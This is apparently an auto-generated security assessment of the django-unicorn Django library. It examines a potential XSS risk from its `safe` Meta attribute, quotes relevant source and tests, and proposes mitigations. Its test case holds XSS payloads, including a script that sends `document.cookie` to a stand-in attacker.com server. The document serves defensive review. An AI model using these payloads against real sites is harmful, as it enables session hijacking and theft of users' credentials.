## Vulnerability List for django-unicorn project

### 1. Potential Cross-Site Scripting (XSS) in Template Rendering

- Description:
    - Django-unicorn renders dynamic content within Django templates, potentially using user-provided data. While the library includes output encoding mechanisms, a vulnerability could arise if user-provided data is rendered in component templates without being properly processed by these mechanisms.
    - An attacker could inject malicious JavaScript code into user-controlled input fields or parameters.
    - If these inputs bypass the intended output encoding and are directly rendered within the HTML templates, the injected script will be executed in the browsers of users viewing the page.
    - Step-by-step trigger:
        1. An attacker identifies a component template that renders user-controlled data.
        2. The attacker attempts to craft a malicious input containing JavaScript code, for example, `<script>alert('XSS')</script>`.
        3. The attacker injects this malicious input through a form field, URL parameter, or any other user-accessible data entry point that feeds into the component's data.
        4. If django-unicorn fails to apply output encoding to this specific data rendering path, the malicious script will be embedded into the HTML output.
        5. When a user's browser renders the page containing the component, the injected JavaScript code executes.

- Impact:
    - A successful XSS attack can have severe consequences:
        - **Account Takeover:** Attackers can steal session cookies or user credentials, gaining unauthorized access to user accounts.
        - **Session Hijacking:** By capturing session identifiers, attackers can hijack user sessions and perform actions on behalf of the user.
        - **Website Defacement:** Malicious scripts can alter the content and appearance of the web page, defacing the website.
        - **Redirection to Malicious Sites:** Users can be redirected to attacker-controlled websites, potentially leading to phishing attacks or malware infections.
        - **Data Theft:** Sensitive user data displayed on the page can be exfiltrated to a remote server controlled by the attacker.

- Vulnerability Rank: High

- Currently Implemented Mitigations:
    - **Output Encoding:** Django-unicorn utilizes BeautifulSoup for template rendering, which by default encodes HTML entities during serialization, offering a base level of output encoding.
    - **`sanitize_html` function:** The library includes a `sanitize_html` function in `django_unicorn/utils.py` which uses `html.escape` to escape HTML/XML special characters.
    - **`sanitize_html` in `UnicornTemplateResponse`:** The `sanitize_html` function is used in `django_unicorn/components/unicorn_template_response.py` to sanitize the `init` data that is embedded within a `<script type="application/json">` tag.
    - **`safe` Meta attribute:** Components can define a `Meta` class with a `safe` tuple attribute, listing component attributes that should *not* be HTML-encoded. This provides a mechanism to bypass encoding for specific attributes when developers explicitly deem it safe. **However, misuse of this feature can introduce XSS vulnerabilities if user-provided data is marked as safe without proper sanitization.**

- Missing Mitigations:
    - **Comprehensive Output Encoding:** Ensure that *all* user-provided data rendered in component templates, not just the `init` data, is consistently and effectively output encoded (e.g., HTML entity encoding) to prevent browsers from interpreting injected script tags. Verify that BeautifulSoup's default encoding is applied in all relevant rendering paths within django-unicorn.
    - **Input Sanitization:** While output encoding is crucial, consider implementing server-side input sanitization as an additional defense layer. This would involve cleansing user-provided data of potentially malicious scripts before it's processed by django-unicorn, providing defense-in-depth.
    - **Content Security Policy (CSP):** Implementing a strict Content Security Policy is highly recommended to limit the sources from which the browser is allowed to load resources. This significantly reduces the impact of XSS attacks even if output encoding is bypassed, by restricting the actions malicious scripts can perform.
    - **Security Audits and Testing:** Regular security audits and penetration testing, specifically focused on XSS vulnerabilities in django-unicorn components, are essential to identify and remediate any potential weaknesses or overlooked rendering paths.
    - **Caution and Documentation for `safe` attribute:**  Clearly document the risks associated with the `safe` Meta attribute. Emphasize that it should only be used when absolutely necessary and with extreme caution, ideally only for data that is guaranteed to be safe and not user-controlled. Provide guidelines on how to properly sanitize data even when using the `safe` attribute, if it's unavoidable.

- Preconditions:
    - The application must be using django-unicorn to render dynamic components.
    - Component templates must render user-provided data directly or indirectly (e.g., through `safe` attribute) without ensuring it is processed by output encoding mechanisms.
    - An attacker must be able to inject malicious script content into data that is processed by a django-unicorn component and rendered in a template.

- Source Code Analysis:
    - **`django_unicorn/utils.py` - `sanitize_html`:** This file defines `sanitize_html` function which uses `html.escape` for HTML entity encoding. This function is a positive security measure.
    ```python
    def sanitize_html(html: str) -> SafeText:
        """
        Escape all the HTML/XML special characters with their unicode escapes, so
        value is safe to be output in JSON.

        This is the same internals as `django.utils.html.json_script` except it takes a string
        instead of an object to avoid calling DjangoJSONEncoder.
        """

        html = html.translate(_json_script_escapes)
        return mark_safe(html)  # noqa: S308
    ```
    - **`django_unicorn/components/unicorn_template_response.py` - `UnicornTemplateResponse.render()`:** This method uses `sanitize_html` to process the `init` data which is then embedded in a `<script>` tag.
    ```python
                json_tag = soup.new_tag("script")
                json_tag["type"] = "application/json"
                json_tag["id"] = json_element_id
                json_tag.string = sanitize_html(init)
    ```
    - **`django_unicorn/components/unicorn_template_response.py` - `UnicornTemplateResponse._desoupify()`:** This method, used to serialize the BeautifulSoup object back to HTML, utilizes `formatter=UnsortedAttributes()`. `UnsortedAttributes` extends `HTMLFormatter` which is initialized with `entity_substitution=EntitySubstitution.substitute_html`. This indicates that BeautifulSoup is configured to perform HTML entity encoding during serialization, which should help mitigate XSS.
    ```python
    class UnsortedAttributes(HTMLFormatter):
        """
        Prevent beautifulsoup from re-ordering attributes.
        """

        def __init__(self):
            super().__init__(entity_substitution=EntitySubstitution.substitute_html)

        def attributes(self, tag: Tag):
            yield from tag.attrs.items()
    ```
    - **`tests/views/test_process_component_request.py` - `test_safe_html_entities_not_encoded`:** This test demonstrates the usage of the `safe` Meta attribute. When `safe = ("hello",)` is defined in `FakeComponentSafe.Meta`, the `hello` attribute is rendered without HTML encoding. This can be a potential vulnerability if the developer intends to render user-provided content as safe without proper sanitization.
    ```python
    class FakeComponentSafe(UnicornView):
        template_name = "templates/test_component_variable.html"

        hello = ""

        class Meta:
            safe = ("hello",)


    def test_safe_html_entities_not_encoded(client):
        data = {"hello": "test"}
        action_queue = [
            {
                "payload": {"name": "hello", "value": "<b>test1</b>"},
                "type": "syncInput",
            }
        ]
        response = post_and_get_response(
            client,
            url="/message/tests.views.test_process_component_request.FakeComponentSafe",
            data=data,
            action_queue=action_queue,
        )

        assert not response["errors"]
        assert response["data"].get("hello") == "<b>test1</b>"
        assert "<b>test1</b>" in response["dom"]
    ```
    - **Analysis:** While django-unicorn includes `sanitize_html` and uses BeautifulSoup's HTML encoding as default, the introduction of the `safe` Meta attribute creates a potential bypass for these mitigations. If developers incorrectly use `safe` to mark user-provided data as safe, it will be rendered without encoding, leading to XSS vulnerabilities. It is crucial to ensure that the usage of `safe` is very limited, well-documented with security warnings, and ideally coupled with explicit sanitization when absolutely necessary. Further investigation is needed to identify all code paths where data is rendered and whether these paths are consistently protected by output encoding, or if they could be vulnerable through misuse of the `safe` attribute or other bypass methods. The files `test_construct_model.py` and `test_set_property_from_data.py` highlight the data handling within components, reinforcing the importance of securing data rendering in templates, but do not introduce new specific vulnerabilities beyond the identified XSS risk.

- Security Test Case:
    - _To be refined and executed on a running instance of an application using django-unicorn._
    - Step-by-step test:
        1. Deploy a Django application that utilizes django-unicorn and includes a component that renders user-provided data.
        2. **Test case 1: Default encoding (without `safe` attribute):**
            a. Create a simple component with a text input field bound to a `message` property in the component's view.
            b. Render `{{ message }}` directly in the component's template, outside of any explicit sanitization or encoding filters and without using `safe` attribute.
            c. Access the deployed application in a web browser as an external attacker.
            d. Locate the input field associated with the django-unicorn component.
            e. Enter the following XSS payload into the input field: `<img src=x onerror=alert('XSS Vulnerability - Default Encoding')>`.
            f. Trigger an update to the component.
            g. Observe the browser's behavior. If the alert box does *not* appear, it indicates that default output encoding is working as expected in this context. If the alert box *does* appear, default encoding is bypassed.
        3. **Test case 2: Bypassing encoding with `safe` attribute:**
            a. Modify the component from Test case 1 to include a `Meta` class and `safe = ("message",)` attribute.
            b. Keep rendering `{{ message }}` in the component's template as before.
            c. Access the deployed application in a web browser as an external attacker.
            d. Locate the input field associated with the django-unicorn component.
            e. Enter the following XSS payload into the input field: `<img src=x onerror=alert('XSS Vulnerability - Safe Attribute')>`.
            f. Trigger an update to the component.
            g. Observe the browser's behavior. If an alert box with the message "XSS Vulnerability - Safe Attribute" *does* appear, this confirms that the `safe` attribute bypasses the default output encoding, and XSS is possible if used with user-provided data.
        4. **Further Validation (for both test cases):**
            a. Try a more impactful payload that attempts to steal cookies and send them to an attacker-controlled server: `<script>window.location='http://attacker.com/cookie_steal?cookie='+document.cookie;</script>` (replace `http://attacker.com` with a server you control for testing).
            b. Check your attacker server logs to see if the cookie was successfully exfiltrated.

This vulnerability assessment is updated to include the security implications of the `safe` Meta attribute, emphasizing the potential for XSS if misused. The security test case is expanded to specifically test both default encoding behavior and the bypass provided by the `safe` attribute.
